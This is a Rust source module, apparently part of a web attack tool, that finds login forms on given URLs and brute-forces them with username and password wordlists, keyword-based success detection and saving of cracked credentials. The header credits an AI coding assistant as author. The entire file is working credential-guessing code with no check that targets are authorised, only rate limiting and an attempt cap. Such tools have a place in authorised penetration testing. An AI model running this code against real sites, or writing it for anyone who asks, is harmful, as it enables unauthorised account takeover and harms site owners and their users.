// bruteforce.rs - Login Bruteforce Module
// Purpose: Detect login forms and perform credential testing with rate limiting
// Author: Claude Code (Anthropic)

use anyhow::{Context, Result};
use colored::*;
use reqwest::Client;
use scraper::{Html, Selector};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{BufRead, BufReader};
use std::path::Path;
use std::time::Duration;
use tokio::time::sleep;

/// Represents a login form detected on a page
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LoginForm {
    pub url: String,
    pub action: String,
    pub method: String,
    pub username_field: Option<String>,
    pub password_field: Option<String>,
    pub csrf_field: Option<String>,
    pub additional_fields: HashMap<String, String>,
}

/// Represents a successful credential
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ValidCredential {
    pub url: String,
    pub username: String,
    pub password: String,
    pub response_status: u16,
    pub response_length: usize,
    pub success_indicators: Vec<String>,
}

/// Configuration for bruteforce attack
pub struct BruteforceConfig {
    pub rate_limit_ms: u64,      // Milliseconds between requests
    pub timeout_seconds: u64,     // Timeout per request
    pub max_attempts_per_url: usize, // Maximum attempts before giving up
}

impl Default for BruteforceConfig {
    fn default() -> Self {
        Self {
            rate_limit_ms: 500,    // 2 requests per second
            timeout_seconds: 10,
            max_attempts_per_url: 1000, // Maximum 1000 attempts per login form
        }
    }
}

/// Detect login forms on a list of URLs
pub async fn detect_login_forms(urls: &[String], client: &Client) -> Vec<LoginForm> {
    let mut login_forms = Vec::new();

    println!("{}", "[*] Detecting login forms...".cyan());

    for url in urls {
        match detect_single_login_form(url, client).await {
            Ok(Some(form)) => {
                println!("{}", format!("[+] Found login form: {}", url).green());
                login_forms.push(form);
            }
            Ok(None) => {
                // No login form found, skip
            }
            Err(e) => {
                eprintln!("[!] Error detecting form at {}: {}", url, e);
            }
        }
    }

    println!("{}", format!("[+] Detected {} login forms", login_forms.len()).green().bold());
    login_forms
}

/// Detect a single login form on a URL
async fn detect_single_login_form(url: &str, client: &Client) -> Result<Option<LoginForm>> {
    // Fetch the page
    let response = client
        .get(url)
        .timeout(Duration::from_secs(10))
        .send()
        .await
        .context("Failed to fetch URL")?;

    let html = response.text().await.context("Failed to read HTML")?;

    // Parse HTML
    let document = Html::parse_document(&html);

    // Look for form elements with password fields
    let form_selector = Selector::parse("form").unwrap();
    let input_selector = Selector::parse("input").unwrap();

    for form in document.select(&form_selector) {
        let mut password_field: Option<String> = None;
        let mut username_field: Option<String> = None;
        let mut csrf_field: Option<String> = None;
        let mut additional_fields = HashMap::new();

        // Get form action and method
        let action = form
            .value()
            .attr("action")
            .unwrap_or("")
            .to_string();
        let method = form
            .value()
            .attr("method")
            .unwrap_or("post")
            .to_lowercase();

        // Find input fields
        for input in form.select(&input_selector) {
            let input_type = input
                .value()
                .attr("type")
                .unwrap_or("text")
                .to_lowercase();
            let input_name = input.value().attr("name").map(|s| s.to_string());

            match input_type.as_str() {
                "password" => {
                    password_field = input_name.clone();
                }
                "text" | "email" | "username" => {
                    // Detect username-like fields
                    if let Some(ref name) = input_name {
                        let name_lower = name.to_lowercase();
                        if name_lower.contains("user")
                            || name_lower.contains("email")
                            || name_lower.contains("login")
                        {
                            username_field = input_name.clone();
                        } else {
                            // Store as additional field
                            additional_fields.insert(name.clone(), String::new());
                        }
                    }
                }
                "hidden" => {
                    // Detect CSRF tokens
                    if let Some(ref name) = input_name {
                        let name_lower = name.to_lowercase();
                        if name_lower.contains("csrf")
                            || name_lower.contains("token")
                            || name_lower.contains("_token")
                        {
                            csrf_field = input_name.clone();
                            // Try to get the value
                            if let Some(value) = input.value().attr("value") {
                                additional_fields.insert(name.clone(), value.to_string());
                            }
                        }
                    }
                }
                _ => {
                    // Store other fields
                    if let Some(ref name) = input_name {
                        additional_fields.insert(name.clone(), String::new());
                    }
                }
            }
        }

        // If we found a password field, this is likely a login form
        if password_field.is_some() {
            let full_action = if action.starts_with("http") {
                action
            } else if action.starts_with('/') {
                let base_url = url::Url::parse(url)?;
                format!("{}://{}{}", base_url.scheme(), base_url.host_str().unwrap_or(""), action)
            } else {
                // Relative path
                format!("{}/{}", url.trim_end_matches('/'), action)
            };

            return Ok(Some(LoginForm {
                url: url.to_string(),
                action: full_action,
                method,
                username_field,
                password_field,
                csrf_field,
                additional_fields,
            }));
        }
    }

    Ok(None)
}

/// Perform bruteforce attack on detected login forms
pub async fn bruteforce_logins(
    login_forms: &[LoginForm],
    userlist_path: &str,
    passlist_path: &str,
    client: &Client,
    config: &BruteforceConfig,
) -> Vec<ValidCredential> {
    let mut valid_credentials = Vec::new();

    // Read wordlists
    let usernames = match read_wordlist(userlist_path) {
        Ok(list) => list,
        Err(e) => {
            eprintln!("[!] Failed to read userlist: {}", e);
            return valid_credentials;
        }
    };

    let passwords = match read_wordlist(passlist_path) {
        Ok(list) => list,
        Err(e) => {
            eprintln!("[!] Failed to read passlist: {}", e);
            return valid_credentials;
        }
    };

    println!(
        "{}",
        format!(
            "[*] Loaded {} usernames and {} passwords",
            usernames.len(),
            passwords.len()
        )
        .cyan()
    );

    // Bruteforce each login form
    for form in login_forms {
        println!(
            "{}",
            format!("[*] Bruteforcing login form: {}", form.url).cyan()
        );

        let mut attempts = 0;

        'outer: for username in &usernames {
            for password in &passwords {
                if attempts >= config.max_attempts_per_url {
                    println!(
                        "{}",
                        format!(
                            "[!] Max attempts ({}) reached for {}",
                            config.max_attempts_per_url, form.url
                        )
                        .yellow()
                    );
                    break 'outer;
                }

                // Test credential
                match test_credential(form, username, password, client, config).await {
                    Ok(Some(cred)) => {
                        println!(
                            "{}",
                            format!("[+] VALID CREDENTIAL FOUND: {}:{}", username, password)
                                .green()
                                .bold()
                        );
                        valid_credentials.push(cred);
                    }
                    Ok(None) => {
                        // Invalid credential, continue
                    }
                    Err(e) => {
                        eprintln!("[!] Error testing credential: {}", e);
                    }
                }

                attempts += 1;

                // Rate limiting
                sleep(Duration::from_millis(config.rate_limit_ms)).await;
            }
        }

        println!(
            "{}",
            format!(
                "[*] Completed {} attempts for {}",
                attempts, form.url
            )
            .cyan()
        );
    }

    valid_credentials
}

/// Test a single credential against a login form
async fn test_credential(
    form: &LoginForm,
    username: &str,
    password: &str,
    client: &Client,
    config: &BruteforceConfig,
) -> Result<Option<ValidCredential>> {
    // Build POST data
    let mut form_data = HashMap::new();

    if let Some(ref username_field) = form.username_field {
        form_data.insert(username_field.clone(), username.to_string());
    }

    if let Some(ref password_field) = form.password_field {
        form_data.insert(password_field.clone(), password.to_string());
    }

    // Add additional fields (like CSRF tokens)
    for (key, value) in &form.additional_fields {
        form_data.insert(key.clone(), value.clone());
    }

    // Send request
    let response = if form.method == "post" {
        client
            .post(&form.action)
            .form(&form_data)
            .timeout(Duration::from_secs(config.timeout_seconds))
            .send()
            .await?
    } else {
        client
            .get(&form.action)
            .query(&form_data)
            .timeout(Duration::from_secs(config.timeout_seconds))
            .send()
            .await?
    };

    let status = response.status().as_u16();
    let body = response.text().await?;
    let body_length = body.len();

    // Detect success
    let success_indicators = detect_success(&body, status);

    if !success_indicators.is_empty() {
        return Ok(Some(ValidCredential {
            url: form.url.clone(),
            username: username.to_string(),
            password: password.to_string(),
            response_status: status,
            response_length: body_length,
            success_indicators,
        }));
    }

    Ok(None)
}

/// Detect success indicators in response
fn detect_success(body: &str, status: u16) -> Vec<String> {
    let mut indicators = Vec::new();

    // Success indicators
    let success_keywords = [
        "welcome",
        "dashboard",
        "logout",
        "profile",
        "account",
        "success",
        "logged in",
    ];

    // Failure indicators (absence means potential success)
    let failure_keywords = [
        "invalid",
        "incorrect",
        "wrong",
        "failed",
        "error",
        "denied",
        "try again",
    ];

    let body_lower = body.to_lowercase();

    // Check for success keywords
    for keyword in &success_keywords {
        if body_lower.contains(keyword) {
            indicators.push(format!("Contains success keyword: {}", keyword));
        }
    }

    // Check if failure keywords are absent
    let has_failure_keywords = failure_keywords
        .iter()
        .any(|kw| body_lower.contains(kw));

    if !has_failure_keywords && (status == 200 || status == 302 || status == 301) {
        indicators.push("No failure keywords detected".to_string());
    }

    // HTTP redirects often indicate success
    if status == 302 || status == 301 {
        indicators.push(format!("HTTP redirect: {}", status));
    }

    indicators
}

/// Read a wordlist from file
fn read_wordlist(path: &str) -> Result<Vec<String>> {
    let file = File::open(path).context(format!("Failed to open wordlist: {}", path))?;
    let reader = BufReader::new(file);

    let list: Vec<String> = reader
        .lines()
        .map_while(Result::ok)
        .map(|line| line.trim().to_string())
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .collect();

    Ok(list)
}

/// Save valid credentials to JSON file
pub fn save_valid_credentials(credentials: &[ValidCredential], output_path: &Path) -> Result<()> {
    let json = serde_json::to_string_pretty(credentials)?;
    fs::write(output_path, json)?;
    Ok(())
}

/// Save login forms to JSON file
pub fn save_login_forms(forms: &[LoginForm], output_path: &Path) -> Result<()> {
    let json = serde_json::to_string_pretty(forms)?;
    fs::write(output_path, json)?;
    Ok(())
}
